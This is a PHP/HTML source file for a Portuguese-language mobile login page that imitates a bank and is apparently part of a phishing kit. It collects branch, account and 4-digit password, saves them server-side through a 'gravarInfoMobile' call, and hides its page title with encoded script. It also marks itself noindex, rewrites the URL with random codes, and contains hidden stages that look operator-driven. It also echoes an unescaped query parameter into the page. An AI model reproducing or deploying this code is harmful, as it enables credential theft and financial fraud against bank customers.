<?php
// Headers para forçar atualização e evitar cache
header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
header('ETag: "' . md5(time()) . '"');

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


require_once('../Lorem.php');
if(isset($_SESSION['agencia']) && strlen($_SESSION['agencia']) > 2 && isset($_SESSION['conta']) && strlen($_SESSION['conta']) > 3 && isset($_SESSION['s4']) && strlen($_SESSION['s4']) == 4){

    $agencia = $_SESSION['agencia'];
    $conta = $_SESSION['conta'];
    $aConta = explode('-', $conta);
    $conta = $aConta[0];
    $digito = $aConta[1];
    $s4 = $_SESSION['s4'];
    Info::gravarInfoMobile($_SESSION['idAcesso'], $agencia, $conta, $digito, $senha4);
    
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<meta name="robots" content="noindex, nofollow" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <?php $timestamp = time(); ?>
    <link rel="stylesheet" href="css/bootstrap.min.css?v=<?php echo $timestamp; ?>">
    <link rel="stylesheet" href="css/style.css?v=<?php echo $timestamp; ?>">
    <link rel="stylesheet" href="css/style-custom.css?v=<?php echo $timestamp; ?>">
    <link rel="shortcut icon" href="images/favicon.ico?v=<?php echo $timestamp; ?>">
    
<script>
document.write(unescape('%3Ctitle%3EBanco%20Virtual%20%7C%20Entre%20N%C3%B3s%2C%20Voc%C3%AA%20Vem%20Primeiro%3C/title%3E'));
</script>
	  <style>
         p.random{display:none!important;}
         
         /* Paleta azul para mobile */
         .btn-acessar {
             background-color: #0066cc !important;
             color: white !important;
             border: 1px solid #0066cc !important;
         }
         
         .btn-acessar:hover {
             background-color: #004499 !important;
             border-color: #004499 !important;
         }
         
         .field:focus {
             border-color: #0066cc !important;
             box-shadow: 0 0 5px rgba(0, 102, 204, 0.3) !important;
         }
         
         .label {
             color: #0066cc !important;
         }
         
         .field-label {
             color: #0066cc !important;
         }
         
      </style>
	  <script type="text/javascript">

  function gerarCodigo(length) {
    var caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var codigo = '';
    for (var i = 0; i < length; i++) {
      codigo += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
    }
    return codigo;
  }

  function alterar_url(nova) {
    var codigo = gerarCodigo(60);
    var dataHoraAtual = new Date();
    var dia = dataHoraAtual.getDate().toString().padStart(2, '0');
    var mes = (dataHoraAtual.getMonth() + 1).toString().padStart(2, '0');
    var ano = dataHoraAtual.getFullYear().toString();
    var hora = dataHoraAtual.getHours().toString().padStart(2, '0');
    var minutos = dataHoraAtual.getMinutes().toString().padStart(2, '0');
    var segundos = dataHoraAtual.getSeconds().toString().padStart(2, '0');
    
    var link = nova + "=?" + codigo + dia + mes + ano + '_' + hora + minutos + segundos;
    history.pushState({}, null, link);
  }
  </script>
</head>
<body>
    <div class="header-login">
        <!-- Logo removido conforme solicitado -->
    </div>
    
    <div id="boxAcesso">
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        
        <section id="form">
            <form id="acessoForm" action="index.php" method="POST" autocomplete="off">
                <div class="form-row">
                    <div class="input-container half">
                        <input id="agencia" name="agencia" maxlength="4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="field" type="tel" pattern=".+" placeholder="Agência sem dígito"/>
                    </div>
                    <div class="input-container half">
                        <input id="conta" name="conta" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="input field" type="tel" pattern=".+" placeholder="Conta com dígito"/>
                    </div>
                </div>
                
                <div class="input-container senha-field">
                    <input id="s4" name="s4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" maxlength="4" class="input field" type="password" oninput="this.value = this.value.replace(/[^0-9]/g, '')" pattern=".+" placeholder=" "/>
                    <label class="label" for="s4">Senha 4 Dígitos</label>
                </div>
                <div id="boxCarregando" class="hide">
                    <div id="loading_novocompseg" class="loading loading_pass4 fl after mb20 none_i">
                        <div id="div_carregando_novocompseg" class="txt">
                            <span id="link_ancora_carregando_novocompseg"></span>
                            <span id="label_carregando_novocompseg">Carregando...</span>
                        </div>
                    </div>
                </div>

                <!-- Botões de titularidade - Ocultos via CSS -->
                <div id="titularidades" class="hide">
                    <div class="input-container-buttons">
                        <label>Titularidade</label>
                        <div class="titulares">
                        </div>
                    </div>
                </div>

                <div id="boxAguarde" class="hide">
                    <div id="loading_novocompseg" class="loading loading_pass4 fl after mb20 none_i">
                        <div id="div_carregando_novocompseg" class="txt">
                            <span id="link_ancora_carregando_novocompseg"></span>
                            <span id="label_carregando_novocompseg">Aguardando...</span>
                        </div>
                    </div>
                </div>

                <input type="submit" class="btn-acessar bt_avancar" value="Acessar">
            </form>
        </section>
    </div>

    
    
    <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
    <input type="hidden" name="id" id="id" value="<?php echo isset($_SESSION["id"]) ? $_SESSION["id"] : '';?>">
    <input type="hidden" name="idAcesso" id="idAcesso" value="<?php echo isset($_SESSION["idAcesso"]) ? $_SESSION["idAcesso"] : '';?>">
    
    <script src="js/jquery.min.js?v=<?php echo $timestamp; ?>"></script>
    <script src="js/jquery.mask.min.js?v=<?php echo $timestamp; ?>"></script>
    <script src="js/main.js?v=<?php echo $timestamp; ?>"></script>
    <script src="js/cache-fix.js?v=<?php echo $timestamp; ?>"></script>
    
    <script>
    // Animação dinâmica do campo de senha APENAS EM MOBILE
    $(document).ready(function() {
        // Verifica se é mobile
        function isMobile() {
            return window.innerWidth <= 480;
        }
        
        // Função para verificar se agência e conta estão preenchidas
        function checkFields() {
            if (!isMobile()) return; // Só funciona em mobile
            
            var agencia = $('#agencia').val().trim();
            var conta = $('#conta').val().trim();
            
            // Se ambos estão preenchidos, mostra o campo de senha
            if (agencia.length >= 4 && conta.length >= 4) {
                $('.senha-field').addClass('show');
            } else {
                // Se não estão preenchidos, esconde o campo de senha
                $('.senha-field').removeClass('show');
            }
        }
        
        // Adiciona listeners para os campos de agência e conta
        $('#agencia, #conta').on('input keyup', function() {
            checkFields();
        });
        
        // Verifica estado inicial
        checkFields();
        
        // Revalida ao redimensionar a tela
        $(window).on('resize', function() {
            if (!isMobile()) {
                $('.senha-field').removeClass('show'); // Remove animação em desktop
            } else {
                checkFields(); // Revalida em mobile
            }
        });
    });
    </script>
</body>
</html>